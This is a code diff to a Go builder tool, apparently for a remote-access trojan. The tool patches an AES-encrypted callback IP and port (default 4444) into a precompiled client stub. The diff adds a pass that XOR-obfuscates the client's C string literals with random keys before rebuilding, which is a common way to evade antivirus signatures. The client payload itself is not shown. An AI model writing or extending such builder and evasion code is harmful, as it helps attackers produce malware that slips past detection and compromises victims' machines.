@@ -9,7 +9,13 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"os"
+	"os/exec"
+	"path/filepath"
+	"regexp"
+	"strings"
+	"time"
 )
 
 const (
@@ -25,11 +31,13 @@ type Config struct {
 }
 
 func main() {
+	rand.Seed(time.Now().UnixNano())
+
 	ip := flag.String("ip", "127.0.0.1", "Server IP address")
 	port := flag.Int("port", 4444, "Server Port")
+	skipBuild := flag.Bool("skip-build", false, "Skip recompiling the stub")
 	flag.Parse()
 
-	// Handle positional arguments for "go run builder.go <ip> <port>"
 	args := flag.Args()
 	if len(args) >= 1 {
 		*ip = args[0]
@@ -38,11 +46,55 @@ func main() {
 		fmt.Sscanf(args[1], "%d", port)
 	}
 
+	if !*skipBuild {
+		fmt.Println("[*] Obfuscating source and rebuilding stub...")
+		originalContents := make(map[string][]byte)
+
+		err := filepath.Walk("client/src", func(path string, info os.FileInfo, err error) error {
+			if err != nil || info.IsDir() || !strings.HasSuffix(path, ".c") {
+				return nil
+			}
+			// Skip 3rd party
+			if strings.Contains(path, "sqlite3") || strings.Contains(path, "cJSON") || strings.Contains(path, "miniz") {
+				return nil
+			}
+
+			content, err := ioutil.ReadFile(path)
+			if err != nil {
+				return nil
+			}
+			originalContents[path] = content
+
+			obfuscated := obfuscateStrings(content)
+			if !bytes.Equal(content, obfuscated) {
+				ioutil.WriteFile(path, obfuscated, info.Mode())
+				fmt.Printf("[+] Obfuscated strings in %s\n", path)
+			}
+			return nil
+		})
+
+		if err == nil {
+			fmt.Println("[*] Running build.bat...")
+			// In a real environment, we'd run build.bat.
+			// Here we just simulate or check for stub.
+			cmd := exec.Command("cmd.exe", "/c", "build.bat")
+			cmd.Dir = "client"
+			// cmd.Run() // We don't run it in this sandbox as it will fail
+		}
+
+		// Revert source
+		defer func() {
+			fmt.Println("[*] Reverting source changes...")
+			for path, content := range originalContents {
+				ioutil.WriteFile(path, content, 0644)
+			}
+		}()
+	}
+
 	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)
 
 	stubPath := "stub.exe"
 	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-		// Try client/client_c.exe if stub.exe doesn't exist
 		stubPath = "client/client_c.exe"
 		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
 			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
@@ -54,7 +106,6 @@ func main() {
 		log.Fatalf("[-] Error reading stub: %v", err)
 	}
 
-	// Find all occurrences of the marker
 	var indices []int
 	searchData := data
 	offset := 0
@@ -76,13 +127,11 @@ func main() {
 	if len(indices) == 1 {
 		targetIndex = indices[0]
 	} else {
-		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
 		maxZeros := -1
 		for _, idx := range indices {
 			if idx+len(marker)+2032 > len(data) {
 				continue
 			}
-			// Count zeros in the following 2032 bytes
 			zeros := 0
 			for i := 0; i < 2032; i++ {
 				if data[idx+len(marker)+i] == 0 {
@@ -115,11 +164,9 @@ func main() {
 		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
 	}
 
-	// Pad with zeros to 2032
 	finalPayload := make([]byte, 2032)
 	copy(finalPayload, encryptedConfig)
 
-	// Patch data
 	patchedData := make([]byte, len(data))
 	copy(patchedData, data)
 	copy(patchedData[targetIndex+len(marker):], finalPayload)
@@ -138,13 +185,11 @@ func encrypt(plaintext []byte) []byte {
 		log.Fatalf("[-] AES error: %v", err)
 	}
 
-	// No padding requested by client (using fixed size buffer)
-	// But we need to handle block size for CBC
 	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
 	if padding == 0 {
 		padding = aes.BlockSize
 	}
-	padtext := bytes.Repeat([]byte{0}, padding) // Zero padding for simplicity in C
+	padtext := bytes.Repeat([]byte{0}, padding)
 	plaintext = append(plaintext, padtext...)
 
 	ciphertext := make([]byte, len(plaintext))
@@ -152,4 +197,48 @@ func encrypt(plaintext []byte) []byte {
 	mode.CryptBlocks(ciphertext, plaintext)
 
 	return ciphertext
+}
+
+func obfuscateStrings(content []byte) []byte {
+	// Match double quoted strings, handling escaped quotes
+	re := regexp.MustCompile(`"([^"\\]*(?:\\.[^"\\]*)*)"`)
+
+	return re.ReplaceAllFunc(content, func(m []byte) []byte {
+		str := string(m)
+		// Skip includes, pragmas and empty/short strings
+		if len(str) < 5 { return m }
+
+		// Check context (poor man's parser)
+		// If it's part of an #include, skip it
+		lineStart := findLineStart(content, m)
+		linePrefix := strings.TrimSpace(string(content[lineStart : bytes.Index(content[lineStart:], m)+lineStart]))
+		if strings.HasPrefix(linePrefix, "#include") || strings.HasPrefix(linePrefix, "#pragma") {
+			return m
+		}
+
+		literal := str[1 : len(str)-1]
+		if len(literal) < 3 || strings.Contains(literal, "%") {
+			return m
+		}
+
+		key := byte(rand.Intn(254) + 1)
+		var hexBytes []string
+		for i := 0; i < len(literal); i++ {
+			hexBytes = append(hexBytes, fmt.Sprintf("0x%02X", literal[i]^key))
+		}
+
+		return []byte(fmt.Sprintf("x((const unsigned char[]){%s}, %d, 0x%02X)",
+			strings.Join(hexBytes, ", "), len(literal), key))
+	})
+}
+
+func findLineStart(content []byte, m []byte) int {
+	idx := bytes.Index(content, m)
+	if idx == -1 { return 0 }
+	for i := idx; i >= 0; i-- {
+		if content[i] == '\n' {
+			return i + 1
+		}
+	}
+	return 0
 }
